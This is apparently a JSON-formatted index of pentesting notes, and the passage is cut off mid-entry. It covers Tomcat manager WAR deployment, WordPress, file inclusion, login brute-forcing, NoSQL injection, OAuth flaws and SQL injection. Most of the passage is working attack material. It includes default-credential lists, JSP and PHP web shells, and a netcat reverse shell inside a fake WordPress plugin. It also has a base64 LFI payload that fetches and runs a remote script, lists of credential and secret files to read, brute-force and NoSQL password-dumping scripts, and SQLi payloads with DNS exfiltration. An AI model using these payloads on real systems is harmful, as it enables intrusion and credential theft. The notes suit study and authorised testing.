root:changethis root:owaspbwa root:password root:password1 root:Password1 root:r00t root:root root:toor tomcat: tomcat:admanager tomcat:admin tomcat:admin tomcat:adrole1 tomcat:adroot tomcat:ads3cret tomcat:adtomcat tomcat:advagrant tomcat:changethis tomcat:password tomcat:password1 tomcat:s3cret tomcat:s3cret tomcat:tomcat xampp:xampp server_admin:owaspbwa admin:owaspbwa demo:demo From Admin to Reverse Shell If you have access to the Tomcat Web Application Manager, you are able to upload and deploy a malicious .war file. Finding the endpoint First is important to find the endpoint. manager text list manager list curl -u tomcat:'password' http: localhost:8080 manager text list OK - Listed applications for virtual host [localhost] :running:0:ROOT examples:running:0: usr share tomcat9-examples examples host-manager:running:1: usr share tomcat9-admin host-manager manager:running:0: usr share tomcat9-admin manager Creating a shell (.WAR) There are serveral ways to create the war. MSFVenom Reverse Shell msfvenom -p java jsp_shell_reverse_tcp LHOST=&lt;ip-addr&gt; LPORT=&lt;port&gt; -f war -o revshell.war Manual Web Shell Create a index.jsp with the following content: &lt;FORM METHOD=GET ACTION='index.jsp'&gt; &lt;INPUT name='cmd' type=text&gt; &lt;INPUT type=submit value='Run'&gt; &lt; FORM&gt; &lt;%@ page import=\"java.io.*\" %&gt; &lt;% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"&lt; br&gt;\"; } } catch(IOException e) { e.printStackTrace(); } } %&gt; &lt;pre&gt;&lt;%=output %&gt;&lt; pre&gt; And run the following commands: mkdir webshell cp index.jsp webshell cd webshell jar -cvf .. webshell.war * webshell.war is created Uploading the shell We just need to upload it and visit the path. curl --upload-file webshell.war -u tomcat:'$3cureP4s5w0rd123!' http: localhost:8001 manager text deploy?path= shell OK - Deployed application at context path [ shell] Finally we can visit the path: http: locahost:8080 shell References https: book.hacktricks.xyz pentesting pentesting-web tomcat#post https: www.youtube.com watch?v=yTHtLi9YZ2s"
					}

					
				
			
		
			
				
					,
					

					"software-wordpress": {
						"id": "software-wordpress",
						"title": "WordPress",
						"category": "",
						"url": " /software/wordpress/",
						"content": "Wordpress is maybe the most common CMS on internet. WPScan wpscan --url http: example.com -e ap,at,cb,dbe,u1-5,m1-15 --api-token &lt;APITOKEN&gt; From Admin to RCE Theme Editor We can modify a theme by adding a reverse shell or a webshell on the 404.php file. Installing Plugin Another way to obtain a reverse shell is to upload and install a plugin. It is important to add the comment lines in order to a successful installation. &lt;?php * Plugin Name: HackinNotes Wordpress Shell Plugin URI: https: github.com leonjza wordpress-shell Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at wp-content plugins shell shell.php. Commands can be given using the 'cmd' GET parameter. Eg: \"http: 192.168.0.1 wp-content plugins shell shell.php?cmd=id\", should provide you with output such as &lt;code&gt;uid=33(www-data) gid=verd33(www-data) groups=33(www-data)&lt; code&gt; Author: Leon Jacobs Version: 0.3 Author URI: https: leonjza.github.io * system(\"rm tmp f;mkfifo tmp f;cat tmp f| bin sh -i 2&gt;&amp;1|nc 10.10.10.10 443 &gt; tmp f\");?&gt; After that we just need to zip it and install. zip revshell-plugin.zip revshell-plugin.php"
					}

					
				
			
		
			
				
					,
					

					"web-file-inclusion": {
						"id": "web-file-inclusion",
						"title": "File Inclusion",
						"category": "",
						"url": " /web/file-inclusion/",
						"content": "File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server. Introduction Path Travesal can lead to two different types of File Inclusion: Local File Inclusion (LFI): When is possible to include a local file. Remote File Inclusion (RFI): When is possible to include remote files. Path Traversal Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. A search for path traversals begins with the examination of URL query strings and form bodies in search of values that appears as file references, including the most common indicator as file extensions. &lt;img src=\" loadImage?filename=218.png\"&gt; The loadImage URL takes a filename parameter and returns the contents of the specified file. The image files themselves are stored on disk in the location var www images . var www images 218.png So we can request the following url to retrieve an arbitrary file from the server’s filesystem: https: insecure-website.com loadImage?filename=.. .. .. etc passwd This causes the application to read from the following file path var www images .. .. .. etc passwd Interesting Files There are some interesting files to read, such as information about the server (users, groups), logs, etc… Linux etc passwd etc shadow etc issue etc group etc hostname etc ssh ssh_config etc ssh sshd_config root .ssh id_rsa root .ssh authorized_keys home user .ssh authorized_keys home user .ssh id_rsa proc [0-9]* fd [0-9]* proc mounts home $USER .bash_history home $USER .ssh id_rsa var run secrets kubernetes.io serviceaccount var lib mlocate mlocate.db var lib mlocate.db Apache etc apache2 apache2.conf usr local etc apache2 httpd.conf etc httpd conf httpd.conf Red Hat CentOS Fedora Linux -&gt; var log httpd access_log Debian Ubuntu -&gt; var log apache2 access.log FreeBSD -&gt; var log httpd-access.log var log apache access.log var log apache error.log var log apache2 access.log var log apache error.log MySQL var lib mysql mysql user.frm var lib mysql mysql user.MYD var lib mysql mysql user.MYI Windows boot.ini autoexec.bat windows system32 drivers etc hosts windows repair SAM windows panther unattended.xml windows panther unattend unattended.xml windows system32 license.rtf windows system32 eula.txt Local File Inclusion (LFI) Its similar to Path Traversal but not exactly the same, the difference is, in file inclusion if we include a PHP it will be interpreted and executed while in path traversal not. PHP Wrappers PHP provides several protocols wrappers that we can use to exploit path traversal and local file inclusion vulnerabilities. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities. Wrapper data: Used to embed inline data as part of the URL with plaintext or base64. include.php?file=data:text plain,&lt;?php system($_GET[\"cmd\"]);?&gt;&amp;cmd=id include.php?file=data:,&lt;?php system($_GET[\"cmd\"]);?&gt;&amp;cmd=id include.php?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&amp;cmd=id include.php?file=data:application x-httpd-php;charset=utf-8;base64,PD9waHAgZXhlYygnY3VybCBodHRwOi8vMTAuMjEyLjEzNC4yOjQ0My9pc2VjLnNoIHwgc2gnKSA Pg== Wrapper filter: Used to encode convert files. Usefull to read php files. The part of php: filter is case insensitive. include.php?file=php: filter read=string.rot13 resource=file.php include.php?file=php: filter conver.base64-encode resource=file.php include.php?file=pHp: Filter conver.base64-encode resource=file.php include.php?file=php: filter zlib.deflate convert.base64-encode resource=file.php To read the compression data you need to decode the base64 and read the resulting data using: php -a readfile('php: filter zlib.inflate resource=test.deflated'); Wrapper zip: Upload a Zip file with a PHPShell inside and access it. echo \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt; pre&gt;\" &gt; payload.php; zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php http: example.com index.php?page=zip: shell.jpg%23payload.php Wrapper expect: Used to execute code. include.php?file=except: id Wrapper input: Interpret php payload sent by POST parameters. include.php?file=php: input POST DATA: &lt;?php system($_GET[\"cmd\"]);?&gt; Remote File Inclusion (RFI) When we are able to include remote files to the application is synonym of remote code execution. We can include a webshell or a reverse shell. usr share webshells php php-reverse-shell.php Or you can create a php file with command execution or another type of reverse shell: &lt;?php $output = shell_exec('whoami 2&gt;&amp;1'); echo \"$output\"; ?&gt; Finally you only need to set up a HTTP server or SMB server and request the rev shell. include.php?file=http: ip-addr:port php-reverse-shell.php include.php?file=\\\\ip-addr\\smbserver\\php-reverse-shell.php Some times impacket-smbserver doesn’t works due to the outdated SMB version of the target machine and we need to configure it manually. ❯ cat etc samba smb.conf [global] server role = standalone server map to guest = Bad User usershare allow guest = yes host allow = &lt;ip-target-machine&gt; [badsmb] path = &lt;directory&gt; browseable = yes read only = no guest ok = yes Looking to RCE There are several ways to escalate a LFI to a RCE. Via Log Poisoning We can poison the logs with the user agent. GET HTTP 1.O Host: example.com User-Agent: &lt;?php system($_GET[\"cmd\"]);?&gt; And try to access to var log apache2 access.log. include.php?file=.. .. .. .. var log apache2 access.log&amp;cmd=id Via Email If SMTP is open in the server we can easily send a mail to an internal account. “user@localhost” containing the following payload &lt;?php system($_GET[\"cmd\"]);?&gt; And access to the mail inbox of the user. include.php?file=.. .. .. .. var mail user&amp;cmd=id Via Environ Like a log file, sending the payload in the User-Agent, it will be reflected inside the proc self environ file. GET include.php?file=.. .. .. .. proc self environ&amp;cmd=id HTTP 1.O Host: example.com User-Agent: &lt;?php system($_GET[\"cmd\"]);?&gt; Via Upload If exists a functionality that leads us to upload an arbitrary file, we can upload directly a reverse shell or simply upload a image with the payload injected on metadata. To modify metadata of a file we can use exiftool. exiftool -DocumentName='&lt;?php system($_GET[\"cmd\"]);?&gt;' myimage.jpg Once uploaded we can access it. include.php?file=.. .. uploads myimage.jpg&amp;cmd=id References https: portswigger.net web-security file-path-traversal https: book.hacktricks.xyz pentesting-web file-inclusion"
					}

					
				
			
		
			
				
					,
					

					"web-login-panes": {
						"id": "web-login-panes",
						"title": "Login Panes",
						"category": "",
						"url": " /web/login-panes/",
						"content": "We can find some login panes that we want to bypass or bruteforce. Here you can find some amazing tricks. Bruteforce it! Hydra hydra is a powerful network service attack tool that attacks a variety of protocol authentication schemes, including SSH and HTTP. POST Forms hydra &lt;ip-addr&gt; -l user -P passwords.txt -s &lt;port&gt; -vV -f http-form-post \" index.php:user=^USER^&amp;password=^PASS^:Invalid Credentials\" -l user -L user wordlist -p password -P password wordlist Basic Auth hydra &lt;ip-addr&gt; -l user -P passwords.txt -s &lt;port&gt; -vV -f http-get index.php My own script I made my own script in order to bruteforce some login panes with CSRF protection. I think is a good alternative to the Burpsuite Pitchfork attack. #! usr bin env python3 import sys, os, requests, codecs s = requests.Session() # Get CRSF TOKEN resp = s.get(\"https: WEBPAGE.LOCAL \", verify=False) regex = '&lt;input type=\"hidden\" name=\"csrf\" value=\"(.*)\"' token = re.search(regex,resp.text).group(1) with codecs.open(\" usr share wordlists rockyou.txt\", 'r', encoding='utf-8', errors='ignore') as wordlist: dic = wordlist.read().splitlines() for pwd in dic: #Bruteforce data_post = { \"csrf\" : token, \"username\" : \"admin\", \"password\" : pwd, } print(\"[!] Trying: \" + pwd) resp2 = s.post(\"https: WEBPAGE.LOCAL login\", json=data_post, verify=False) if \"permission_denied\" not in resp2.text: print(\"Username = \" + username + \"Password = \" + pwd) sys.exit(0) Bypass it! The are very different methods to bypass a login pane, this are the most common ones. SQLi There are more info to bypass login panes with SQL Injections in: sqli.md PHP Type Juggling (==) How PHP’s type comparison features lead to vulnerabilities and in that case to bypass the login. Loose comparisons (==) have a set of operand conversion rules to make it easier for developers. Let’s check the differences between Strict comparisons (===) and Loose comparisons (==). When we find some code like this: if($_POST['password'] == \"secretpass\") Instead of send a string we send an array we will bypass the login: username=admin&amp;password[]= https: owasp.org www-pdf-archive PHPMagicTricks-TypeJuggling.pdf Magic Hashes This particular implication for password hashes wen the operator equals-equals(==) is used. The problem is in == comparison, the 0e means that if the following characters are all digits the whole string gets treated as a float. Below is a list of hash types that when hashed are ^0+ed*$ which equates to zero in PHP when magic hashes typing using the “==” operator is applied. That means that when a password hash starts with “0e…” as an example it will always appear to match the below strings, regardless of what they actually are if all of the subsequent characters are digits from “0-9”. # MD5 240610708 - 0e462097431906509019562988736854 QNKCDZO - 0e830400451993494058024219903391 aabg7XSs - 0e087386482136013740957780965295 https: www.whitehatsec.com blog magic-hashes Client Certificates SSL TLS certificates are commonly used for both encryption and identification of the parties, sometimes this is used instead of credentials at login. Setting up the private key and the certificate (Server) First of all, we need to generate our keys and certificates. We use the openssl command-line tool. openssl req -x509 -newkey rsa:4096 -keyout server_key.pem -out server_cert.pem -nodes -days 365 -subj \" CN=localhost O=Client\\ Certificate\\ Demo\" Setting up client certificates To create a key and a Certificate Signing Request for Alice and Bob we can use the following command: openssl req -newkey rsa:4096 -keyout alice_key.pem -out alice_csr.pem -nodes -days 365 -subj \" CN=Alice\" openssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj \" CN=Bob\" Server Signed Certificate: openssl x509 -req -in alice_csr.pem -CA server_cert.pem -CAkey server_key.pem -out alice_cert.pem -set_serial 01 -days 365 Maybe during the pentest we found the server key, remember that we can download the server certificate with the browser. Self-Signed Certificate: openssl x509 -req -in bob_csr.pem -signkey bob_key.pem -out bob_cert.pem -days 365 Trying to get in To use these certificates in our browser or via curl, we need to bundle them in PKCS#12 format. openssl pkcs12 -export -clcerts -in alice_cert.pem -inkey alice_key.pem -out alice.p12 openssl pkcs12 -export -in bob_cert.pem -inkey bob_key.pem -out bob.p12 Via Browser Settings -&gt; Privacy &amp; Security -&gt; Security -&gt; Certificates -&gt; View Certificates... -&gt; Your Certificates -&gt; Import Via Curl curl --insecure --cert mvc1009.p12 --cert-type p12 https: localhost:443 https: medium.com @sevcsik authentication-using-https-client-certificates-3c9d270e8326 References: https: www.netsparker.com blog web-security php-type-juggling-vulnerabilities https: medium.com swlh php-type-juggling-vulnerabilities-3e28c4ed5c09 https: book.hacktricks.xyz pentesting pentesting-web php-tricks-esp https: owasp.org www-pdf-archive PHPMagicTricks-TypeJuggling.pdf"
					}

					
				
			
		
			
				
					,
					

					"web-nosqli": {
						"id": "web-nosqli",
						"title": "NoSQL Injection (NoSQLi)",
						"category": "",
						"url": " /web/nosqli/",
						"content": "NoSQL injection attacks can be especially dangerous because code Introduction NoSQL injection vulnerabilities allow attackers to inject code into commands for databases that don’t use SQL queries, such as MongoDB. NoSQL injection attacks can be especially dangerous because code is injected and executed on the server in the language of the web application, potentially allowing arbitrary code execution. Simple MongoDB Injection For a basic authentication bypass, the attacker can try to enter MongoDB operators in field values, for example $eq (equals), $ne (not equal to) or $gt (greater than). Here’s an unsafe way to build a database query in a PHP application, with the parameter values taken directly from a form: $query = array(\"user\" =&gt; $_POST[\"username\"], \"password\" =&gt; $_POST[\"password\"]); If this query is then used to check login credentials, the attacker can abuse PHP’s built-in associative array processing to inject a MongoDB query that always returns true and bypass the authentication process. This may be as simple as sending the following POST request: username[$ne]=1&amp;password[$ne]=1 PHP will translate this into an array of arrays: array(\"username\" =&gt; array(\"$ne\" =&gt; 1), \"password\" =&gt; array(\"$ne\" =&gt; 1)); When sent as a MongoDB query to a user store, this will find all users where the user name and password are not equal to 1, which is highly likely to be true and may allow the attacker to bypass authentication. Login Bypass (PHP) Injecting the $ne : #Find some one where username not equals to \"\" and password not equals to \"\" username[$ne]=&amp;password[$ne]=&amp;login=login Dumping Database (PHP) First instead of $ne we are going to use $regex in order to discover character by character. Get all Usernames First we are going to see al type of characters used in the usernames. import sys, os, requests, codecs import string s = requests.Session() for char in string.ascii_lowercase: regex = '{}.*'.format(char) data_post = { \"username[$regex]\" : regex, \"password[$ne]\" : \"password\", \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: print(\"Valid letter: \" + char) Regex: {}.* ❯ python3 exploit.py Valid letter: a Valid letter: d Valid letter: g Valid letter: i Valid letter: m Valid letter: n Valid letter: o Secondly, we are going to check which one goes at firs position: import sys, os, requests, codecs import string s = requests.Session() valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o'] for char in valid_letters: regex = '^{}.*'.format(char) data_post = { \"username[$regex]\" : regex, \"password[$ne]\" : \"password\", \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: print(\"Starts with: \" + char) Regex: ^{}.* ^ Indicates starts with ❯ python3 exploit.py Starts with: a Starts with: m Finally we are going to loop until fails all characters used. import sys, os, requests, codecs import string s = requests.Session() def nextLetter(word): valid_letters = ['a', 'd', 'g', 'i', 'm', 'n', 'o'] for char in valid_letters: regex = '^{}.*'.format(word+char) data_post = { \"username[$regex]\" : regex, \"password[$ne]\" : \"password\", \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: return char return None def getUser(start): name = start while True: l = nextLetter(name) if l is None: break; else: name += l return name startsWith = ['a', 'm'] for char in startsWith: print('Username: ' + getUser(char)) ❯ python3 enum_letters.py Username: admin Username: mango Get Passwords: Same as users but remember to change the $regex of the user to $ne and the other way with password. import sys, os, requests, codecs import string s = requests.Session() def nextLetter(user, word): special_char = ['^','*', '$', '|', '.','\\\\' ,'+','?'] for char in string.printable: if char in special_char: continue; regex = '^{}.*'.format(word+char) data_post = { \"username\" : user, \"password[$regex]\" : regex, \"login\" : \"login\" } resp = s.post(\"http: staging-order.mango.htb index.php\", data=data_post, verify=False, allow_redirects=False) if resp.status_code == 302: return char return None def getPass(user): passw = \"\" while True: l = nextLetter(user, passw) if l is None: break; else: passw += l return passw users = ['admin', 'mango'] for user in users: print('Username: ' + user + ' Password: ' + getPass(user)) ❯ python3 exploit.py Username: admin Password: t9KcS3&gt;!0B#2 Username: mango Password: h3mXK8RhU~f{]f5H Remember: Escape characters that could lead to problems with a regex."
					}

					
				
			
		
			
				
					,
					

					"web-oauth-2-0-bypass": {
						"id": "web-oauth-2-0-bypass",
						"title": "OAuth 2.0 Bypass",
						"category": "",
						"url": " /web/oauth-2.0-bypass/",
						"content": "Introduction OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user’s account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. Vulnerabilities in the OAuth client application Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure. Improper implementation of the implicit grant type Once the OAuth 2.0 flow is completed and the token is assigned, the information is sent to the application (username, email and the token). We can bypass the authentication by changing the email and username of the request: # Original Request POST authenticate HTTP 1.1 Host: oauth-test.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: application json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https: oauth-test.com oauth-callback Content-Type: application json Origin: https: app-test.com Content-Length: 103 Connection: close Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn { \"email\":\"user@test.com\", \"username\":\"user\", \"token\":\"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi\" } # Edited Request POST authenticate HTTP 1.1 Host: oauth-test.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: application json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https: oauth-test.com oauth-callback Content-Type: application json Origin: https: app-test.com Content-Length: 103 Connection: close Cookie: session=Pjx1J1HBlOKuYpE6ngdvP0lwKrc6N6xn { \"email\":\"another@test.com\", \"username\":\"another\", \"token\":\"0Uk8oyhR95JLrFnDdsgFBcHdcH1Tcz8GmLoZe6ECOAi\" } Flawed CSRF protection (no state parameter) Although many components of the OAuth flows are optional, some of them are strongly recommended unless there’s an important reason not to use them. One such example is the state parameter. The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user’s session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application. Since this state parameter is not available in the request we can link our profile media to an existing account by exploiting a CSRF attack: # CSRF vulnerable request GET oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv HTTP 1.1 Host: app.test.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: text html,application xhtml+xml,application xml;q=0.9,image webp,* *;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: https: exploit.test.com exploit Cookie: session=4UxlhSNG2r19csEDsUySJwHtVPSyE4eE Upgrade-Insecure-Requests: 1 Payload: # index.html &lt;iframe src=\"https: app.test.com oauth-linking?code=FIKlXwX7-cq6Xz0nsWmYUhqu1rwrRmKL9haVHOA7zVv\"&gt; &lt; iframe&gt; Leaking authorization codes and access tokens Depending on the grant type, either a code or token is sent via the victim’s browser to the callback endpoint specified in the redirect_uri parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim’s browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri. In the case of the authorization code flow, an attacker can potentially steal the victim’s code before it is used. They can then send this code to the client application’s legitimate callback endpoint (the original redirect_uri) to get access to the user’s account. # CSRF Vulnerable Request # Modify the redirect_uri to a coontrolled server GET auth?client_id=zg8andmpp2lfjqidng0tr&amp;redirect_uri=https: myserver.com evil&amp;response_type=code&amp;scope=openid%20profile%20email HTTP 1.1 Host: oauth-server.example.com User-Agent: Mozilla 5.0 (X11; Linux x86_64; rv:78.0) Gecko 20100101 Firefox 78.0 Accept: text html,application xhtml+xml,application xml;q=0.9,image webp,* *;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: _session=7rn_lI1PoVH0bMKi3_Cmq; _session.legacy=7rn_lI1PoVH0bMKi3_Cmq Upgrade-Insecure-Requests: 1 Payload: #index.html &lt;iframe src=\"https: oauth-server.example.com auth?client_id=zg8andmpp2lfjqidng0tr&amp;redirect_uri=https: myserver.com evil&amp;response_type=code&amp;scope=openid%20profile%20email\"&gt; &lt; iframe&gt; Pentesting OAuth 2.0 redirect_uri validation redirect_uri parameter should be validated via white list, but sometimes is misconfigured and leads to flaws and vulnerabilities. Things to check: Try to remove or add arbitrary paths, query parameters, and fragments to see what you can change without triggering an error. Try to append extra values to the default redirect_uri parameter: https: example.com &amp;@foo.evil.com#@bar.evil.com . Try duplicate redirect_uri parameter. Begin with localhost : http: localhost.evil.com . References https: portswigger.net web-security oauth"
					}

					
				
			
		
			
				
					,
					

					"web-sqli": {
						"id": "web-sqli",
						"title": "SQL Injection (SQLi)",
						"category": "",
						"url": " /web/sqli/",
						"content": "SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries. Cheat Sheet String Concatenation We can concatenate together multiple strings to make a single strings. It also works to do a subquery Oracle: 'foo'||'bar' Microsoft: 'foo'+'bar' PostgreSQL: 'foo'||'bar' '||(SELECT '' FROM users WHERE ROWNUM = 1)||' MySQL: 'foo' 'bar' CONCAT('foo', 'bar') Note: It’s important while concatenating to only retrieve one element. '||(SELECT '' FROM users WHERE ROWNUM = 1)||' Substring We can extract a part of a string, from a specified offset with a specified length. Oracle: SUBSTR('foobar', 4, 2) Microsoft: SUBSTRING('foobar', 4, 2) PostgreSQL: SUBSTRING('foobar', 4, 2) MySQL: SUBSTRING('foobar', 4, 2) Comments We can use comment to truncate a query and remove the portion of the original query that follows our input. Oracle: --comment Microsoft: --comment *comment* PostgreSQL: --comment *comment* MySQL: #comment -- comment (space included) *comment* Database Version Oracle: SELECT banner FROM v$version SELECT version FROM v$instance Microsoft: SELECT @@version PostgreSQL: SELECT version() MySQL: SELECT @@version Database Contents Oracle: SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME' Microsoft: SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' PostgreSQL: SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' MySQL: SELECT * FROM information_schema.tables SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' Conditional Errors Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1 0) ELSE NULL END FROM dual Microsoft: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1 0 ELSE NULL END PostgreSQL: 1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1 0) ELSE NULL END) MySQL: SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') Stacked Queries We can use batched or stacked queries to execute multipels queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. This technique is primarily of use in realtion to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error or time delay. Oracle: Does not support batched queries Microsoft: QUERY 1; QUERY 2 PostgreSQL: QUERY 1; QUERY 2 MySQL: QUERY 1; QUERY 2 Time Delays Oracle: dbms_pipe.receive_message(('a'),10) Microsoft: WAITFOR DELAY '0:0:10' PostgreSQL: SELECT pg_sleep(10) MySQL: SELECT SLEEP(10) Conditional Time Delays Oracle: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual Microsoft: IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' PostgreSQL: SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END MySQL: SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') DNS Lookup We can cause the database to perform a DNS lookup to an external domain. Oracle: The following technique leverages an XXE vulnerability to trigger a DNS lookup. THe vulnerability has been patched but there are many unpatched Oracle installations in existence. SELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http: BURP-COLLABORATOR-SUBDOMAIN \"&gt; %remote;]&gt;'),' l') FROM dual The following payload works on fully patched oracle database but need elevated privileges. SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') Microsoft: exec master..xp_dirtree ' BURP-COLLABORATOR-SUBDOMAIN a' PostgreSQL: copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' MySQL: Only on Windows. LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\\\a') SELECT INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a' DNS Lookup with data exfiltration We can also use DNS lookups to exfiltrate data such as passwords or other fields of a table. Oracle: SELECT EXTRACTVALUE(xmltype('&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM \"http: '||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN \"&gt; %remote;]&gt;'),' l') FROM dual Microsoft: declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree \" '+@p+'.BURP-COLLABORATOR-SUBDOMAIN a\"') PostgreSQL: create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN'''; execute c; END; $$ language plpgsql security definer; SELECT f(); MySQL: Only on Windows. SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a' Automatization with sqlmap # Post sqlmap -r request.txt -p username # Get sqlmap -u \"http: example.com index.php?id=1\" -p id # Crawl sqlmap -u http: example.com --dbms=mysql --crawl=3 Note: request.txt is a request saved in BurpSuite. Dumping a Table sqlmap -r request.txt -p username -D database_name -T table_name --dump Union Attack When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the UNION keyword can be used to retrieve data from other tables within the database. MySQL syntax for the example: $sql = \"SELECT id, name, text FROM example WHERE id=\" . $_GET['id']; Column Number Enumeration After detect that the application is vulnerable to SQLi we need to know how many columns are queried. To do that task we are going to use order by to guess the number of columns retrieved. The idea is to increment the number until get an error. index.php?id=1 order by 1 index.php?id=1 order by 2 index.php?id=1 order by 3 index.php?id=1 order by 4 - ERROR Finding Columns with a useful data type Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields. index.php?id=1 union all select NULL, NULL, NULL Note: The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every commonly used data type. ' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'-- If the data type of a column is not compatible with string data, the injected query will cause a database error. Extracting Data from Database Now knowing that the third column is for descriptions, we can put there all information. index.php?id=1 union all select 1, 2, @@version index.php?id=1 union all select 1, 2, user() index.php?id=1 union all select 1, 2, table_name from information_schema.tables index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users' index.php?id=1 union all select 1, username, passwords from users Read files Some databases allows us to read or write files in the filesystem. index.php?id=1 union all select 1, 2, load_file(' etc passwd') Retrieving multiple values within a single column We can also concat multiple values for examples users and passwords and print on a single column. ' UNION SELECT username || '~' || password FROM users-- The output will be: administrator~s3cure wiener~peter carlos~montoya From SQLi to RCE Since we are allowed to upload files, we can upload a webshell to the web root. index.php?id=1 union all select 1, 2, \"&lt;?php system($_GET['cmd']);?&gt;\" into OUTFILE ' var www html backdoor.php' In case of exploiting a Microsoft SQL Server check this: SQL Server Login Bypass The most classic ones: ' or '1'='1 ' or 1=1-- - ' or 1=1# Then others: -' ' ' '&amp;' '^' '*' ' or ''-' ' or '' ' ' or ''&amp;' ' or ''^' ' or ''*' \"-\" \" \" \"&amp;\" \"^\" \"*\" \" or \"\"-\" \" or \"\" \" \" or \"\"&amp;\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x Knowing the username When we are aware of some username we can impersonate him with SQLi by introducing the username and commenting the rest of the SQL Query. administrator'-- - administrator'# Error Based SQLi Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs. Example of Microsoft SQL Server: 1', CONVERT(int,SELECT FROM .) a',convert(int,(SELECT CURRENT_USER)))-- a',convert(int,(SELECT DB_NAME(0))))-- a',convert(int,(SELECT DB_NAME(1))))-- # SELECT FIRST TABLE a',convert(int,(SELECT TOP 